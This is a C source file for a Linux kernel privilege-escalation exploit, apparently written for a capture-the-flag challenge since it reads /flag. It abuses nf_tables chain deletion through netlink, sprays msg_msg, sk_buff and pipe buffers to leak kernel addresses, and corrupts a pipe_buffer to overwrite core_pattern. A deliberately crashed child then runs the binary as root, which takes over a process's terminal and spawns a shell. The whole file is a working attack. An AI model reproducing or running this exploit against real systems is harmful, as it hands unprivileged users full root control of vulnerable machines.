// gcc exp.c -o exp -l mnl -l nftnl -w
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <libnftnl/set.h>
#include <linux/netfilter/nfnetlink.h>
#include <signal.h>
#include <net/if.h>
#include <asm/types.h>
#include <linux/ethtool.h>
#include <linux/sockios.h>
#include <assert.h>
#include <netinet/in.h>
#include <stdint.h>
#include <syscall.h>
#include <mqueue.h>
#include <sys/shm.h>
#include <termios.h>
#include <unistd.h>
#include <stdio.h>
#include <sched.h>
#include <err.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <stddef.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/xattr.h>
#include <netinet/ip.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/syscall.h>
#include <pthread.h>
#include <libmnl/libmnl.h>
#include <sys/auxv.h>
#include <sys/sendfile.h>
#include <libnftnl/table.h>
#include <libnftnl/flowtable.h>
#include <libnftnl/chain.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>
#include <libnftnl/object.h>
#include <linux/if_packet.h>
#include <net/ethernet.h> /* the L2 protocols */
#include <sys/socket.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/if_link.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <sys/resource.h>
#include <linux/if.h>
#include <linux/keyctl.h>

struct pipe_buffer
{
    void *page;
    unsigned int offset, len;
    void *ops;
    unsigned int flags;
    unsigned long private;
};

struct
{
    long mtype;
    char mtext[0x2000];
} msg;

void unshare_setup(uid_t uid, gid_t gid)
{
    int temp;
    char edit[0x100];

    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);

    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);

    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);

    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);

    return;
}

void set_cpu_affinity(int cpu_n, pid_t pid)
{
    cpu_set_t set;

    CPU_ZERO(&set);
    CPU_SET(cpu_n, &set);

    if (sched_setaffinity(pid, sizeof(set), &set) < 0)
        err(1, "sched_setaffinity");
}

void root(char *buf)
{
    int pid = strtoull(buf, 0, 10);
    int pfd = syscall(SYS_pidfd_open, pid, 0);
    int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
    int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
    int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
    dup2(stdinfd, 0);
    dup2(stdoutfd, 1);
    dup2(stderrfd, 2);
    system("cat /flag;/bin/sh");
}

void rt_newlink(struct mnl_socket *sock, char *link_name, unsigned int link_id)
{
    char buf[MNL_SOCKET_BUFFER_SIZE];
    struct nlmsghdr *nlh;
    struct ifinfomsg *ifm;
    unsigned int seq, portid;
    struct nlattr *linkinfo, *data;

    // fprintf(stderr, "[+] Create new link: %s_%u\n", link_name, link_id);

    nlh = mnl_nlmsg_put_header(buf);
    nlh->nlmsg_type = RTM_NEWLINK;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_ACK;
    nlh->nlmsg_seq = seq = time(NULL);

    ifm = mnl_nlmsg_put_extra_header(nlh, sizeof(*ifm));
    ifm->ifi_family = AF_INET;
    ifm->ifi_change = 0xFFFFFFFF;
    ifm->ifi_index = link_id;
    ifm->ifi_flags = IFF_UP;

    mnl_attr_put_str(nlh, IFLA_IFNAME, link_name);
    linkinfo = mnl_attr_nest_start(nlh, IFLA_LINKINFO);
    mnl_attr_put_str(nlh, IFLA_INFO_KIND, "dummy");
    data = mnl_attr_nest_start(nlh, IFLA_INFO_DATA);

    mnl_attr_nest_end(nlh, data);
    mnl_attr_nest_end(nlh, linkinfo);

    // mnl_nlmsg_fprintf(stdout, nlh, nlh->nlmsg_len, sizeof(struct ifinfomsg));

    portid = mnl_socket_get_portid(sock);
    mnl_socket_sendto(sock, nlh, nlh->nlmsg_len);
    int ret = mnl_socket_recvfrom(sock, buf, sizeof(buf));
    mnl_cb_run(buf, ret, seq, portid, NULL, NULL);
}

void rt_dellink(struct mnl_socket *sock, unsigned int link_id)
{
    char buf[MNL_SOCKET_BUFFER_SIZE];
    struct nlmsghdr *nlh;
    struct ifinfomsg *ifm;
    unsigned int seq, portid;

    // fprintf(stderr, "[+] Delete link: %u\n", link_id);

    nlh = mnl_nlmsg_put_header(buf);
    nlh->nlmsg_type = RTM_DELLINK;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    nlh->nlmsg_seq = seq = time(NULL);

    ifm = mnl_nlmsg_put_extra_header(nlh, sizeof(*ifm));
    ifm->ifi_family = AF_INET;
    ifm->ifi_index = link_id;

    // mnl_nlmsg_fprintf(stdout, nlh, nlh->nlmsg_len, sizeof(struct ifinfomsg));

    portid = mnl_socket_get_portid(sock);
    mnl_socket_sendto(sock, nlh, nlh->nlmsg_len);
    int ret = mnl_socket_recvfrom(sock, buf, sizeof(buf));
    mnl_cb_run(buf, ret, seq, portid, NULL, NULL);
}

uint8_t family = NFPROTO_INET;

#define NF_INET_INGRESS 5

static void create_basechain(struct mnl_nlmsg_batch *batch, uint32_t seq,
                             char *table_name, char *chain_name, int flags, uint64_t handle)
{
    struct nftnl_chain *chain = nftnl_chain_alloc();
    if (chain == NULL)
    {
        errx(1, "Cannot into nftnl_chain_alloc()");
    }

    nftnl_chain_set_u32(chain, NFTNL_CHAIN_FAMILY, family);
    nftnl_chain_set_str(chain, NFTNL_CHAIN_TABLE, table_name);
    nftnl_chain_set_str(chain, NFTNL_CHAIN_NAME, chain_name);
    nftnl_chain_set_u32(chain, NFTNL_CHAIN_HOOKNUM, NF_INET_INGRESS);
    nftnl_chain_set_u32(chain, NFTNL_CHAIN_PRIO, 10);
    nftnl_chain_set_u32(chain, NFTNL_CHAIN_POLICY, NF_ACCEPT);
    nftnl_chain_set_str(chain, NFTNL_CHAIN_DEV, "lo");
    if (flags != 0)
        nftnl_chain_set_u32(chain, NFTNL_CHAIN_FLAGS, flags);
    if (handle != 0xff)
    {
        nftnl_chain_set_u64(chain, NFTNL_CHAIN_HANDLE, handle);
    }

    struct nlmsghdr *nlh = nftnl_chain_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
        NFT_MSG_NEWCHAIN,
        family,
        NLM_F_CREATE | NLM_F_ACK,
        seq);
    nftnl_chain_nlmsg_build_payload(nlh, chain);
    mnl_nlmsg_batch_next(batch);

    nftnl_chain_free(chain);
}

static void update_basechain(struct mnl_nlmsg_batch *batch, uint32_t seq,
                             char *table_name, char *chain_name, char *dev_name)
{
    struct nftnl_chain *chain = nftnl_chain_alloc();
    if (chain == NULL)
    {
        errx(1, "Cannot into nftnl_chain_alloc()");
    }

    nftnl_chain_set_u32(chain, NFTNL_CHAIN_FAMILY, family);
    nftnl_chain_set_str(chain, NFTNL_CHAIN_TABLE, table_name);
    nftnl_chain_set_str(chain, NFTNL_CHAIN_NAME, chain_name);
    nftnl_chain_set_u32(chain, NFTNL_CHAIN_HOOKNUM, NF_INET_INGRESS);
    nftnl_chain_set_u32(chain, NFTNL_CHAIN_PRIO, 10);
    nftnl_chain_set_str(chain, NFTNL_CHAIN_DEV, dev_name);

    struct nlmsghdr *nlh = nftnl_chain_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
        NFT_MSG_NEWCHAIN,
        family,
        NLM_F_CREATE | NLM_F_ACK,
        seq);
    nftnl_chain_nlmsg_build_payload(nlh, chain);
    mnl_nlmsg_batch_next(batch);

    nftnl_chain_free(chain);
}

static void del_chain(struct mnl_nlmsg_batch *batch, uint32_t seq,
                      char *table_name, char *chain_name)
{
    struct nftnl_chain *chain = nftnl_chain_alloc();
    if (chain == NULL)
    {
        errx(1, "Cannot into nftnl_chain_alloc()");
    }

    nftnl_chain_set_u32(chain, NFTNL_CHAIN_FAMILY, family);
    nftnl_chain_set_str(chain, NFTNL_CHAIN_TABLE, table_name);
    nftnl_chain_set_str(chain, NFTNL_CHAIN_NAME, chain_name);

    struct nlmsghdr *nlh = nftnl_chain_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
        NFT_MSG_DELCHAIN,
        family,
        NLM_F_ACK,
        seq);
    nftnl_chain_nlmsg_build_payload(nlh, chain);
    mnl_nlmsg_batch_next(batch);

    nftnl_chain_free(chain);
}

uint64_t net_addr = 0;

static uint64_t get_basechain(
    char *table_name, char *chain_name)
{
    struct mnl_socket *nl;
    char buf[MNL_SOCKET_BUFFER_SIZE];
    struct nlmsghdr *nlh;
    uint32_t portid, seq, type = NFTNL_OUTPUT_DEFAULT;
    struct nftnl_chain *t = NULL;
    int ret;

    seq = time(NULL);

    t = nftnl_chain_alloc();
    if (t == NULL)
    {
        perror("OOM");
        exit(EXIT_FAILURE);
    }
    nlh = nftnl_nlmsg_build_hdr(buf, NFT_MSG_GETCHAIN, family,
                                NLM_F_ACK, seq);
    nftnl_chain_set_str(t, NFTNL_CHAIN_TABLE, table_name);
    nftnl_chain_set_str(t, NFTNL_CHAIN_NAME, chain_name);
    nftnl_chain_nlmsg_build_payload(nlh, t);
    nftnl_chain_free(t);

    nl = mnl_socket_open(NETLINK_NETFILTER);
    if (nl == NULL)
    {
        perror("mnl_socket_open");
        exit(EXIT_FAILURE);
    }

    if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0)
    {
        perror("mnl_socket_bind");
        exit(EXIT_FAILURE);
    }
    portid = mnl_socket_get_portid(nl);

    if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0)
    {
        perror("mnl_socket_send");
        exit(EXIT_FAILURE);
    }

    ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
    uint64_t val = *(uint64_t *)(buf + 0x64);
    while (ret > 0)
    {
        ret = mnl_cb_run(buf, ret, seq, portid, NULL, NULL);
        if (ret <= 0)
        {
            printf("mnl_cb_run error: %d\n", ret);
            break;
        }
        ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
    }
    if (ret == -1)
    {
        perror("error");
        exit(EXIT_FAILURE);
    }
    mnl_socket_close(nl);

    return val;
}

#define SOCKET_NUM 16
#define SK_BUFF_NUM 20

#define PIPE_NUM 256
#define PACKET_NUM 0x150

uint64_t core_pattern_addr = 0xffffffff83fb48c0;
uint64_t vdso_image_64_data = 0xffffffff833eb000;

int sfd[SOCKET_NUM][2];
int p[PACKET_NUM];
int cfd[2];
int msqid[0x3000];
int pfd[PIPE_NUM][2];

int main(int argc, char **argv)
{
    if (argc > 1)
    {
        root(argv[1]);
        exit(0);
    }
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(0, &cpuset);
    sched_setaffinity(0, sizeof(cpuset), &cpuset);

    socketpair(AF_UNIX, SOCK_STREAM, 0, cfd);

    if (fork() == 0)
    {
        int memfd = memfd_create("", 0);
        char buf[0x10];
        sendfile(memfd, open("/proc/self/exe", 0), 0,
                 0xffffffff);
        dup2(memfd, 666);
        close(memfd);
        read(cfd[0], buf, 1);
        printf("trigger crash\n");
        *(size_t *)0 = 0;
    }

    for (int i = 0; i < SOCKET_NUM; i++)
        socketpair(AF_UNIX, SOCK_STREAM, 0, sfd[i]);

    for (int i = 0; i < 0x3000; i++)
    {
        msqid[i] = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
        if (msqid[i] < 0)
            printf("msgget01 Failed 0x%x\n", i);
    }

    char table1_name[] = "table";
    char chain1_name[] = "chain1";
    char chain2_name[] = "chain2";
    char chain3_name[] = "chain3";
    char chain4_name[] = "chain4";
    struct mnl_socket *nl;
    size_t buf_size = MNL_SOCKET_BUFFER_SIZE * 100;
    uint64_t heap_addr = 0;
    char *buf = malloc(buf_size);
    char *udata_buf = malloc(0x1000);
    struct mnl_nlmsg_batch *batch;
    int seq = 0;
    struct nlmsghdr *nlh;
    int retry = 0;
    struct mnl_socket *nl_route;

    while (true)
    {

        printf("[+] Setting up sandbox...\n");
        unshare_setup(getuid(), getgid());

        nl_route = mnl_socket_open(NETLINK_ROUTE);
        mnl_socket_bind(nl_route, 0, MNL_SOCKET_AUTOPID);

        struct fanout_args fa = {.max_num_members = 0x100};
        for (int i = 0; i < PACKET_NUM; i++)
            p[i] = socket(AF_PACKET, SOCK_RAW, 1);

        for (int i = 0; i < SOCKET_NUM / 2; i++)
            for (int j = 0; j < SK_BUFF_NUM; j++)
            {
                write(sfd[i][1], buf, 0xc00);
            }

        rt_newlink(nl_route, "y4g7", 1337);

        for (int i = SOCKET_NUM / 2; i < SOCKET_NUM; i++)
            for (int j = 0; j < SK_BUFF_NUM; j++)
                write(sfd[i][1], buf, 0xc00);

        nl = mnl_socket_open(NETLINK_NETFILTER);

        rt_newlink(nl_route, "y4g77", 1338);
        rt_newlink(nl_route, "y4g777", 1339);
        rt_newlink(nl_route, "y4g7777", 1340);

        struct nftnl_table *table = nftnl_table_alloc();
        nftnl_table_set_str(table, NFTNL_TABLE_NAME, table1_name);
        nftnl_table_set_u32(table, NFTNL_TABLE_FLAGS, 0);

        {
            batch = mnl_nlmsg_batch_start(buf, buf_size);

            nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
            mnl_nlmsg_batch_next(batch);

            nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWTABLE, family, NLM_F_CREATE | NLM_F_ACK, seq++);
            nftnl_table_nlmsg_build_payload(nlh, table);
            mnl_nlmsg_batch_next(batch);

            create_basechain(batch, seq++, table1_name, chain1_name, 0, 0xff);
            update_basechain(batch, seq++, table1_name, chain1_name, "y4g7");
            update_basechain(batch, seq++, table1_name, chain1_name, "y4g7");

            create_basechain(batch, seq++, table1_name, chain2_name, 0, 0xff);
            update_basechain(batch, seq++, table1_name, chain2_name, "y4g77");
            update_basechain(batch, seq++, table1_name, chain2_name, "y4g77");

            create_basechain(batch, seq++, table1_name, chain3_name, 0, 0xff);
            update_basechain(batch, seq++, table1_name, chain3_name, "y4g777");
            update_basechain(batch, seq++, table1_name, chain3_name, "y4g777");

            create_basechain(batch, seq++, table1_name, chain4_name, 0, 0xff);
            update_basechain(batch, seq++, table1_name, chain4_name, "y4g7777");
            update_basechain(batch, seq++, table1_name, chain4_name, "y4g7777");

            nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
            mnl_nlmsg_batch_next(batch);

            mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch));
        }

        {
            for (int i = 0; i < SOCKET_NUM / 2; i++)
                for (int j = 0; j < SK_BUFF_NUM; j++)
                    read(sfd[i][0], buf, 0xc00);

            rt_dellink(nl_route, 1337);

            for (int i = SOCKET_NUM / 2; i < SOCKET_NUM; i++)
                for (int j = 0; j < SK_BUFF_NUM; j++)
                    read(sfd[i][0], buf, 0xc00);

            for (int i = 0; i < PACKET_NUM; i++)
            {
                fa.id = i;
                setsockopt(p[i], SOL_PACKET, PACKET_FANOUT, &fa,
                           sizeof(fa));
            }

            net_addr = get_basechain(table1_name, chain1_name);
            if ((net_addr >> 56) != 0xff)
            {
                for (int i = 0; i < PACKET_NUM; i++)
                    close(p[i]);
                printf("[x] net_addr is not valid! invalid addr: %p\n", (void *)net_addr);
                mnl_socket_close(nl_route);
                mnl_socket_close(nl);
                continue;
            }

            printf("get net addr => %p\n", (void *)net_addr);
            break;
        }
    }

    {
        msg.mtype = 3;
        for (int i = 0x300; i < 0x500; i++)
            msgsnd(msqid[i], &msg, 0xc0 - 0x30, 0);

        msg.mtype = 1;
        for (int i = 0; i < 0x300; i++)
            msgsnd(msqid[i], &msg, 0x100 - 0x30, 0);

        rt_dellink(nl_route, 1338);

        msg.mtype = 2;
        for (int i = 0; i < 0x100; i++)
            msgsnd(msqid[i], &msg, 0x1000 - 0x30, 0);

        msg.mtype = 3;
        for (int i = 0; i < 0x300; i++)
            msgsnd(msqid[i], &msg, 0xc0 - 0x30, 0);

        heap_addr = get_basechain(table1_name, chain2_name);
        if ((heap_addr >> 56) != 0xff)
        {
            printf("[x] heap_addr is not valid! invalid addr: %p\n", heap_addr);
            heap_addr = 0;
        }
        if (heap_addr == 0)
        {
            for (int i = 0; i < 0x300; i++)
            {
                msgrcv(msqid[i], &msg, 0xc0 - 0x30, 3, 0);
            }
            while (true)
            {
                retry++;
                printf("[*] retry to get heap addr, retry %d\n", retry);
                msg.mtype = 3;
                if (retry > 10)
                {
                    printf("[x] retry too many times, exit!\n");
                    exit(0);
                }
                for (int i = 0; i < 0x100; i++)
                    msgsnd(msqid[i + 0x1000], &msg, 0xc0 - 0x30, 0);
                for (int i = 0; i < 0x300; i++)
                    msgsnd(msqid[i], &msg, 0xc0 - 0x30, 0);
                heap_addr = get_basechain(table1_name, chain2_name);
                if ((heap_addr >> 56) != 0xff)
                {
                    printf("[x] heap_addr is not valid! invalid addr: %p\n", heap_addr);
                    continue;
                }
                break;
            }
        }

        printf("get heap addr => %p\n", heap_addr);
    }

    for (int i = 0; i < PIPE_NUM; i++)
        pipe(pfd[i]);

    {
        for (int i = 0; i < 0x300; i++)
            msgrcv(msqid[i], &msg, 0xc0 - 0x30, 3, 0);

        msg.mtype = 3;
        for (int i = 0; i < 0x300; i++)
        {
            memset(&msg.mtext[0x1000 - 0x30 - 8], i, 0x100);
            msgsnd(msqid[i], &msg, 0x1000 - 0x30 + 0xc0 - 0x8, 0);
        }

        rt_dellink(nl_route, 1339);

        *(size_t *)(&buf[0x4f0]) = net_addr;
        *(size_t *)(&buf[0x348]) = heap_addr;

        for (int i = 0; i < SOCKET_NUM; i++)
            for (int j = 0; j < SK_BUFF_NUM; j++)
                write(sfd[i][1], buf, 0xc00);

        batch = mnl_nlmsg_batch_start(buf, buf_size);

        nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
        mnl_nlmsg_batch_next(batch);

        del_chain(batch, seq++, table1_name, chain3_name);

        nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
        mnl_nlmsg_batch_next(batch);

        mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch));
    }

    sleep(1);

    {
        printf("[+] reclaim msg_msg_seg...\n");

        for (int i = 0; i < PIPE_NUM; i++)
            if (fcntl(pfd[i][1], F_SETPIPE_SZ, 0x4000) < 0)
            {
                printf("[x] failed to extend %d pipe!\n", i);
                err(1, "FAILED to extend pipe!");
            }
        printf("[+] reclaim msg_msg_seg done!\n");

        rt_dellink(nl_route, 1340);

        *(size_t *)(&buf[0x4f0]) = net_addr;
        *(size_t *)(&buf[0x348]) = heap_addr;

        for (int i = 0; i < SOCKET_NUM; i++)
            for (int j = 0; j < SK_BUFF_NUM; j++)
            {
                // printf("[+] write to socket pair %d\n", i);
                // printf("[+] write size: %d, sk_buff idx %d\n", 0xc00, j);
                if (write(sfd[i][1], buf, 0xc00) < 0)
                {
                    printf("[x] failed to write to socket pair %d!\n", i);
                    return -1;
                }
            }

        batch = mnl_nlmsg_batch_start(buf, buf_size);

        nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
        mnl_nlmsg_batch_next(batch);

        del_chain(batch, seq++, table1_name, chain4_name);

        nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
        mnl_nlmsg_batch_next(batch);

        if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) < 0)
        {
            err(1, "mnl_socket_send");
        }
        printf("[+] delete chain4 done!\n");
    }

    sleep(1);

    for (int i = 0; i < PIPE_NUM; i++)
        write(pfd[i][1], buf, 0x1000);

    msg.mtype = 6;
    memset(&msg.mtext[0x1000 - 0x30 - 8], 'a', 0x100);

    for (int i = 0; i < 0x500; i++)
        msgsnd(msqid[i + 0x2000], &msg, 0x1000 - 0x30 + 0xc0 - 0x8, 0);

    size_t *vvar = ((size_t *)getauxval(AT_SYSINFO_EHDR));
    struct iovec iov = {vvar, 1};

    for (int i = 0; i < PIPE_NUM; i++)
        vmsplice(pfd[i][1], &iov, 1, 0);

    printf("[+] vmsplice vDSO to the pipe done!\n");

    for (int i = 0; i < 0x500; i++)
    {
        msgrcv(msqid[i + 0x2000], &msg, 0x1000 - 0x30 + 0xc0 - 0x8, 0,
               MSG_COPY | IPC_NOWAIT);
        struct pipe_buffer *p =
            (void *)&msg.mtext[0x1000 - 0x30 - 0x8 + 0x28];
        if (p->len == 1)
        {
            printf("vDSO page => %p\n", p->page);
            msgrcv(msqid[i + 0x2000], &msg,
                   0x1000 - 0x30 + 0xc0 - 0x8, 6, 0);
            p->page += (((core_pattern_addr & 0xfffffffffffff000) - vdso_image_64_data) >> 6);
            p->offset = (core_pattern_addr & 0xfff) - 1;
            p->flags = 0x10;
            break;
        }
    }
    msg.mtype = 7;
    for (int i = 0; i < 0x500; i++)
        msgsnd(msqid[i + 0x2000], &msg, 0x1000 - 0x30 + 0xc0 - 0x8, 0);

    for (int i = 0; i < PIPE_NUM; i++)
        dprintf(pfd[i][1], "%s", "|/proc/%P/fd/666 %P");

    system("cat /proc/sys/kernel/core_pattern");
    write(cfd[1], buf, 1);
    while (1)
        sleep(100);

    return 0;
}